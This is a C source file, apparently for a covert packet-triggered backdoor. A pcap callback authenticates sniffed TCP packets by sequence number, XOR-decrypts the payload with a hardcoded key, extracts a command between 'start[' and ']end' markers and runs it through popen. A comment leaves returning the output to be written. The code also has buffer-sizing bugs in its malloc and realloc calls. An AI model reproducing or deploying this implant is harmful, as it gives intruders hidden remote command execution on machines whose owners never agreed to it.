#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "crypto.h"
#include "packet_auth.h"
#include "packet_handler.h"

/*
 * Executes a command using popen and puts the results into result.
 *
 * NOTE: output must be freed
 *
 * Params:
 *      const char *command: The command to execute.
 *      char **result: The pointer the the output buffer pointer.
 */
void execute_command(const char *command, char **result)
{
    FILE *fp;
    const int MAX_LINE_LEN = 1024;
    char line_buffer[MAX_LINE_LEN];

    fp = popen(command, "r");

    // get the first line to determine the first malloc size
    if (!fgets(line_buffer, MAX_LINE_LEN, fp)) return;
    *result = (char*)malloc(sizeof(char) * strlen(line_buffer));
    strcpy(*result, line_buffer);

    // grab all the lines and realloc and concat string as needed
    while (fgets(line_buffer, MAX_LINE_LEN, fp))
    {
        *result = (char*)realloc(*result, strlen(*result) + strlen(line_buffer));
        if (!*result)
        {
            return;
        }
        strcat(*result, line_buffer);
    }

    pclose(fp);
}


/*
* Callback function for examining captured packets.
*
* Params:
*   u_char* args: Pointer to user data.
*   const struct pcap_pkthdr* header: Struct that contains information about the captured packet.
*   const u_char* packet: Pointer to the captured packet in serialized form.
*
* Returns:
*   None
*
*/
void got_packet(u_char* args, const struct pcap_pkthdr* header, const u_char* packet)
{
    char *command_output;

    const char* COMMAND_START = "start[";
    const char* COMMAND_END = "]end";
    const char* KEY = "key";

    const int MAX_COMMAND_LEN = 1024;

    char command[MAX_COMMAND_LEN];
    char payload_buffer[MAX_COMMAND_LEN];
    char decrypted[MAX_COMMAND_LEN];

    int tcp_sport;
    u_int tcp_seqnum;

    char* payload;
    char* end_ptr;

    const struct sniff_ip* ip;
    const struct sniff_tcp* tcp;

    int size_ip = 0;
    int size_tcp = 0;

    // clear buffers
    memset(command, 0, MAX_COMMAND_LEN);
    memset(payload_buffer, 0, MAX_COMMAND_LEN);
    memset(decrypted, 0, MAX_COMMAND_LEN);

    // calculate lengths
    ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;

    tcp = (struct sniff_tcp*)(packet + SIZE_ETHERNET + size_ip);
    size_tcp = TH_OFF(tcp) * 4;

    tcp_sport = ntohs(tcp->th_sport);
    tcp_seqnum = ntohl(tcp->th_seq);

    // Step 1: Locate the payload of the packet
    payload = (char*)(packet + SIZE_ETHERNET + size_ip + size_tcp);

    // Step 2: Authenticate the packet
    if (!is_seq_num_auth(tcp_sport, tcp_seqnum)) return;
    printf("Got an authenticated packet\n Source port: %u\n Seqnum: %u\n", tcp_sport, tcp_seqnum);

    // Step 3: Decrypt the payload
    hex_str_to_bytes(payload, payload_buffer, strlen(payload));
    xor_decrypt(KEY, strlen(KEY), payload_buffer, strlen(payload) / 2, decrypted);
    printf("Decrypted payload: %s\n", decrypted);

    // Step 4: Verify decrypted payload has a command in it
    if (!(payload = strstr(decrypted, COMMAND_START))) return;
    payload += strlen(COMMAND_START);
    if (!(end_ptr = strstr(decrypted, COMMAND_END))) return;

    // Step 5: Extract the command
    strncpy(command, payload, end_ptr - payload);

    // Step 6: Execute the command
    execute_command(command, &command_output);

    // Step 7: Send the results back
    printf("%s", command_output); // replace this with sending the command results back
    free(command_output); // free command_output which was malloced by execute_command

    return;
}
